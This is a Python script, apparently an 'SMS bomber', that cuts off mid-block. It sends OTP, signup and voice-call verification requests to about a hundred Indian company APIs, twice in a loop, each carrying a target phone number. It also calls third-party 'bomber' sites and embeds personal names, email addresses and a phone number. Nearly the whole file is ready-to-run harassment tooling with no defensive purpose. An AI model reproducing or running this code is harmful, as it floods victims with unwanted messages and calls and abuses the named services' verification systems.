

# import requests 
# from requests.structures import CaseInsensitiveDict
import threading

import multiprocessing
import time
import requests
from requests.structures import CaseInsensitiveDict
from fake_useragent import UserAgent
ua = UserAgent()

def sms(number):
    number = str(number)
    mobile = number
    for i in range(2):


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        response = requests.get('https://www.nearbuy.com/mobile/api/user/login/'+number, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
            'source': 'order_management',
            'type': 'call',
            'hash': True,
        }

        response = requests.post('https://api-app.prod.oziva.in/nitro/send/', headers=headers, json=json_data);pass

    

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'country_code': '0LUnMLYRsqP',
            'phone_number': number,
        }

        response = requests.post('https://saralk.ccdms.in/zila/api/login', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"country_code":"0LUnMLYRsqP","phone_number":"9771241426"}'
        #response = requests.post('https://saralk.ccdms.in/zila/api/login', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': '91'+number,
        }

        # response = requests.post('https://apis.kisansupply.com/customer/request-otp', headers=headers, json=json_data);pass

      

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'input': {
                    'receiver': number,
                },
            },
            'query': 'mutation createOtp($input: OtpInput!) {\n  createOtp(input: $input) {\n    otp {\n      receiver\n      status\n    }\n    errors {\n      field\n      message\n    }\n  }\n}',
            'operationName': 'createOtp',
        }

        response = requests.post('https://maccaron.in/graphql', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
            'source': 'signup',
            'type': 'p',
            'device': 'app',
            'email': '',
        }

        response = requests.post('https://api.moglix.com/login/sendOTP', headers=headers, json=json_data);pass


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        params = {
            'number': number,
        }

        response = requests.get('https://php-web-server--shivamrajput662.repl.co/', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'access': 'signup',
            'phone': number,
            'action': 'generate',
        }

        response = requests.post(
            'https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/',
            headers=headers,
            json=json_data,
        )



        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'customer_key': 'g_lgf0viyk',
            'phone': number,
            'captcha_token': '',
        }

        response = requests.post('https://node2.licious.in/api/v2/otp-signup', headers=headers, json=json_data);pass

   
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'SMS',
            'new_user': True,
            'mobile_number': number,
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNumber': number,
            'appDeviceId': '4c73de5f03c27e38',
            'phoneCode': '+91',
            'requestSource': 'ANDROID',
            'appVersionCode': '2.2.5',
        }

        response = requests.post('https://user.vedantu.com/user/preLoginVerification', headers=headers, json=json_data);pass



        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'lang': 'hi-IN',
        }

        json_data = {
            'descriptor': '+91'+number,
            'type': 'phone',
        }

        response = requests.post('https://api.olx.in/api/v1/challenges', params=params, headers=headers, json=json_data);pass

       

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'loginAttemptCounter': 1.0,
            'mobileNo': number,
        }

        response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, json=json_data);pass


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'signature': '/KmWjMQ7itq',
            'mobile': number,
        }

        response = requests.post('https://swadeshivip.com/api/login', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
            'is_otpgenerated': False,
        }

        response = requests.post('https://api-prod.mymameals.com/auth/generateotp', headers=headers, json=json_data);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'phoneNumber': number,
            'countryCode': '91',
        }

        response = requests.get('https://api.fudr.in/restaurant-service/guests/sendotp', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'username': number,
        }

        response = requests.get('https://api.eyemyeye.com/api/accounts/is_already_registered/', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        response = requests.get('https://be.mcdelivery.co.in/auth/otp/'+number, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        url = 'https://be.mcdelivery.co.in/auth/otp/'+number+'/'

        response = requests.get(url, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'reason': 'loginOrRegister',
            'mobile': number,
        }

        response = requests.get('https://api.kreditbee.in/v1/me/otp', params=params, headers=headers);pass


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        params = {
            'mobileNumber': number,
        }

        response = requests.get('https://securedapi.confirmtkt.com/api/platform/registerOutput', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        response = requests.get('https://www.soutickets.in/api/public/otp/generateOtp/'+number, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'country_code': '91',
            'mobile': number,
        }

        response = requests.get('https://vyaparapp.in/api/ftu/v3/send/otp', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'mobile': '+91-'+number,
        }

        response = requests.get('https://students.byjus.com/mobiles/request_otp', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'ccode': '91',
            'cno': number,
            'action': 'Send OTP',
            'signature': '',
            'attempt': '0',
            'v': '475',
        }

        response = requests.get('https://api.dailymoo.in/app/auth/send-otp', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        url = 'https://www.nearbuy.com/mobile/api/user/otp/resend/'+number+'/CALL'

        response = requests.get(url, headers=headers);pass


        
        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        url = 'https://api.uengage.in/client/login/'+number+'/5'

        response = requests.get(url, headers=headers);pass


       

        

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
            'verificationChannel': 5.0,
        }

        response = requests.post('https://api.rummytime.com/api/auth/generateOtp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.1',
            '_InstallationId': 1.073741823E9,
            'mobileNumber': number,
            '_ApplicationId': 'myAppId',
            'source': 'android',
            'deviceId': 1.073741823E9,
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, json=json_data);pass

 
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNumber': number,
        }

        # response = requests.post(
        #     'https://services.payobank.in/smartcontractengine/mobile/login-otp/send',
        #     headers=headers,
        #     json=json_data,
        # )

       

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'enable-email': 'true',
        }

        json_data = {
            'country_code': 'IN',
            'phone': number,
            'is_un_teach_user': False,
            'otp_type': 1.0,
            'send_otp': True,
            'email': '',
        }

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', params=params, headers=headers, json=json_data);pass

      

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'hash_key': 'XfsoCeXADQA',
            'phone_number': number,
        }

        response = requests.post('https://omni-api.moreretail.in/api/v1/login/', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'appVersion': '15',
            'isVoice': False,
            'gaid': '',
            'customerMobile': number,
            'androidId': '6724a007b0060e30',
            'marketId': '10003',
        }

        response = requests.post('https://api.pokketkredit.com/customer/otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNumber': number,
        }

        response = requests.post('https://api.myhubble.money/v1/auth/otp/generate', headers=headers, json=json_data);pass

     
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
        }

        response = requests.post('https://web-api.mpokket.in/registration/sendOtp', headers=headers, json=json_data);pass

        

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'data': {
                'mobileNumber': number,
            },
        }

        response = requests.post('https://service.upstox.com/login/open/v5/auth/1fa/otp/generate', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'imei': '',
            'otp_hash': 'EW0sznEa82P',
            'contact_number': number,
        }

        response = requests.post('https://api.blackbuck.com/demand-wrapper/demand/v1/signUp', headers=headers, json=json_data);pass

   
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'debug': False,
            'phone': number,
        }

        response = requests.post('https://carnotapp.in/users/auth/', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'payload': {
                'mobile': '+91'+number,
            },
            'type': 'mobile',
        }

        response = requests.post('https://auth.eka.care/auth/init', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
            'name': 'Shivam',
            'email': 'Shivamrajput662h06@gmail.com',
        }

        response = requests.post('https://mentee.jeecarnot.com/register/api/send-otp', headers=headers, json=json_data);pass

       

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'panFetch': True,
            'product': 'PL',
            'method': 'OTP',
            'terms': True,
            'mobile': number,
            'communicationChannels': True,
            'vendorName': 'niro',
        }

        response = requests.post('https://api.niro.money/api/v1/request-login', headers=headers, json=json_data);pass

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'MobileNumber': number,
            'CountryCode': '+91',
        }

        response = requests.post('https://www.capshine.com/api/clubregistration/sendcode', headers=headers, json=json_data);pass

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'email': 'shivamrajput667@gmail.com',
                'mobileNumber': number,
                'firstName': 'Shivam Rajput',
            },
            'query': 'mutation CreateUserMutation($email: String!, $firstName: String!, $mobileNumber: String!) {\n  createUser(email: $email, firstName: $firstName, mobileNumber: $mobileNumber) {\n    user {\n      id\n      dateOfBirth\n      mobileNumber\n      firstName\n      __typename\n    }\n    otp\n    __typename\n  }\n}',
            'operationName': 'CreateUserMutation',
        }

        response = requests.post('https://app.classmateshop.co.in/graphql/', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'country_code': '91',
            'phone': number,
            'action': 'get_otp',
            'flow': 'login',
        }

        response = requests.post('https://www.cuemath.com/api/v4/login/', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'country_code': '+91',
            'phone': number,
        }

        response = requests.post(
            'https://services.rappi.com.br/api/rappi-authentication/login/whatsapp/create',
            headers=headers,
            json=json_data,
        )

     

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNumber': number,
            'appPackageName': 'in.ludo.supremegold',
        }

        response = requests.post('https://app.ludosupreme.com/v1.0/user/requestSignupOtp', headers=headers, json=json_data);pass


       
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'payload': {
                    'mobile': number,
                    'connectoid': 'b17aeac2-2d46-562b-ef52-67b851d3ae6b',
                    'waOtp': False,
                    'platform': 'wap',
                    'utmParams': {},
                },
            },
            'query': 'mutation SendOtp($payload: UserInput!) {\n  sendOtp(payload: $payload) {\n    token\n    name\n    existingUser\n    whatsappOptIn\n    __typename\n  }\n}\n',
            'operationName': 'SendOtp',
        }

        response = requests.post('https://apis.cardekho.com/f8', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'countryCode': '+91',
            'mobile': number,
        }

        response = requests.post(
            'https://us-central1-vootkidsprod-17598.cloudfunctions.net/auth/web/v2/tokens/generate',
            headers=headers,
            json=json_data,
        )

        
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNumber': number,
        }

        response = requests.post('https://api.payrup.com/api/auth/otp/generate', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
        }

        response = requests.post('https://pgtry.com/safalta-app/participants/api/generate-otp/', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'countryCode': '+91',
            'mobile': number,
        }

        response = requests.post('https://api.playo.io/onboard/generateOTP', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile_number': number,
            'client_id': 'kisan-app',
        }

        response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, json=json_data);pass


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNumber': number,
            'newDevice': False,
            'policyPerused': True,
        }

        response = requests.post('https://goplus.in/v3/auth/user/otp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'user': {
                'primary_phone': number,
                'registration_source': 4.0,
            },
        }

        response = requests.post('https://crm.frankrosspharmacy.com/api/v8/user/otp_signin', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'countryCode': '91',
            'p_n': '+91'+number,
        }

        response = requests.post('https://api.rigi.club/api/account/sendotp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'password': '',
            'is_otp': 1.0,
            'mobile': 9.771241426E9,
            'is_password': 0.0,
            'otp': 123456.0,
        }

        response = requests.post('https://cst.brevistay.com/app-api/login', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'firstname': 'Raghav',
            'mobileno': number,
            'email': 'Ravajhit@gmail.com',
        }

        response = requests.post('https://api.toolsvilla.com/web/register', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile_number': number,
        }

        response = requests.post('https://api.cityflo.com/api/v2/users/auth/otp-via-call/', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
        }

        response = requests.post('https://profile.swiggy.com/api/v3/app/request_call_verification', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'submit_hash': '21f9afd8291ed5fd288e3c1dc92726d8',
        }

        json_data = {
            'mobile_phone': number,
            'otp_send_to': 'mobile_phone',
            'new_login_flow': '1',
        }

        response = requests.post('https://apinew.droom.in/v6/account/new-send-login-otp', params=params, headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'feature': '',
            'phone': '+91-'+number,
            'type': 'call',
            'app_client_id': '12d13938-60f3-4a3e-ab56-ddadb86913a2',
        }

        response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data);pass

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'hashkey': '123456789012345678901234512345',
            'phone': number,
        }

        response = requests.post('https://fchapi.familycarehospitals.com/api/v1/user/loginViaPhone', headers=headers, json=json_data);pass
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'IVR',
            'new_user': False,
            'mobile_number': number,
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'osId': '776adbc43e26e1b3',
            'width': '1080',
            'height': '2260',
            'density': '2.75',
            'andOsVersion': '13',
            'userId': '10042661915',
        }

        json_data = {
            'phoneNumber': number,
            'deliveryMode': 'CALL',
        }

        response = requests.post('https://mobile-api-v5.nearbuy.com/v5/otp/resend', params=params, headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
        }

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, json=json_data);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'number': number,
        }

        response = requests.get('https://bomber-tools.xyz/best.php', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'retries': 0.0,
            'phone_number': '91'+number,
        }

        response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, json=json_data);pass

        
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 0.0,
            'mobile': number,
        }

        response = requests.post('https://web.okcredit.in/api/authn/v1.0/otp:request', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
        }

        response = requests.post('https://login.housing.com/api/v2/send-otp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'resendOtp': '0',
            'phoneNumber': '7460092221',
            'hashCode': 'k387IsBaTmn',
            'name': number,
        }

        response = requests.post('https://services.dealshare.in/userservice/api/v1/send-otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otpRegistration': 'true',
            'firstName': 'error',
            'lastName': '22',
            'pincode': '380001',
            'channelType': 'android',
            'userId': number,
            'pincodeArea': 'Ahmedabad',
        }

        response = requests.post('https://digital.dmart.in/api/v1/secure/signup', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'payload': {
                'allowWhatsapp': False,
                'mobile': '+91'+number,
            },
            'type': 'mobile',
        }

        response = requests.post('https://auth.eka.care/auth/init', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'android',
            'instanceId': 'esXLqB--T2CmMBR6f4BHy9',
            'mobile': number,
        }

        response = requests.post('https://card.fplabs.tech:9000/onecard/bff/open/v1/register/otp/voice', headers=headers, json=json_data);pass

        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        params = {
            'phoneNumber': number,
            'countryCode': '91',
        }

        response = requests.get('https://prod.myjar.app/v2/api/auth/sendOTP/call', params=params, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_no': '+91'+number,
            'website': True,
            'is_guest_checkout': False,
        }

        response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_number': '+91'+number,
        }

        response = requests.post('https://api.relevel.com/api/v2/users/send-otp/', headers=headers, json=json_data);pass


        
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'android',
            'instanceId': 'esXLqB--T2CmMBR6f4BHy9',
            'mobile': number,
            'whatsappConsent': True,
        }

        response = requests.post(
            'https://card.fplabs.tech:9000/onecard/bff/open/v2/register/otp/generate',
            headers=headers,
            json=json_data,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': number,
        }

        response = requests.post('https://prod.efeed.in/api/customer/sendOtp', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': '+91-'+number,
            'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
        }

        response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': '+91'+number,
        }

        response = requests.post('https://us-central1-bikai-d5ee5.cloudfunctions.net/generateOTP', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNumber': number,
            'otpTemplateId': '5b4e2e49b70e040008ffbcbe',
        }

        response = requests.post('https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash', headers=headers, json=json_data);pass
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': '+91'+number,
            'allow_whatsapp': False,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'sendOtpToWhatsApp': False,
            'loginAttemptCounter': 3.0,
            'mobileNo': number,
        }

        response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, json=json_data);pass

        
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'buildVersion': '24.0',
            'phone': number,
            'source': 'signup',
            'type': 'p',
            'device': 'mobile',
            'email': '',
        }

        response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isGupshup': True,
            'contact': number,
            'email': 'shivamrajput200@gmail.com',
        }

        response = requests.post('https://api.mamaearth.in/v1/auth/initiateSignup', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': number,
        }

        response = requests.post('https://www.licious.in/api/login/signup', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': '+91'+number,
            'allow_whatsapp': True,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'customer_mobile': number,
        }

        response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'user_id': number,
        }

        response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': '+91'+number,
        }

        response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, json=json_data);pass

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'mobileNumber': number,
            },
            'query': 'mutation CreateAccountOTP($mobileNumber: String!) {\n  createAccountOTP(mobileNumber: $mobileNumber) {\n    status\n    message\n    __typename\n  }\n}',
            'operationName': 'CreateAccountOTP',
        }

        response = requests.post('https://www.mobex.in/graphql', headers=headers, json=json_data);pass

        

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': number,
            'deviceId': '72abdd9a-7038-41c0-a57d-d0022dac60da',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': '+91'+number,
            'userName': 'raghavsdss',
        }

        response = requests.post('https://khiladi.com/v1/exchange/user/userRegisterOtpSent', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': number,
            'deviceId': '1aeb7fad-58d0-4887-9f77-2a469039a413',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNo': number,
        }

        response = requests.post('https://www.loanbaba.com/vywurpzr/MAppService.asmx/SendOTP', headers=headers, json=json_data);pass

    

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'number': number,
            'is_corporate_user': False,
            'otp_on_call': True,
        }

        response = requests.post('https://www.1mg.com/auth_api/v6/create_token', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otp_mode': 'SIGNUP',
            'mobile': number,
        }

        response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': number,
            'digest': '24f17c1f25f8750c556e70cab0c62e0dce7df7945b26f5a27e2570f8575dec6a',
            '_ApplicationId': 'myAppId',
            'time': '2023-10-12T05:54:59.229Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/retryOTP', headers=headers, json=json_data);pass

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'ad_set_id': '',
            'device_id': '8ecdf954a6956e20',
            'ad_name': '',
            'channel': '',
            'placement_id': '',
            'ad_id': '',
            'keyword_id': '',
            'campaign': '',
            'placement': '',
            'keyword': '',
            'mobile_number': number,
            'ad_set_name': '',
            'campaign_id': '',
        }

        response = requests.post('https://api.cityflo.com/api/v2/users/auth/init/', headers=headers, json=json_data);pass

        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'mobile': number,
            'forgotPwdFlag': 'false',
            'type': 'ROLE_HERO_DRIVER',
        }

        response = requests.get('https://dash.bcykal.com/mobycy/api/user/generate/otp', params=params, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'plt': '2',
            'st': '1',
        }

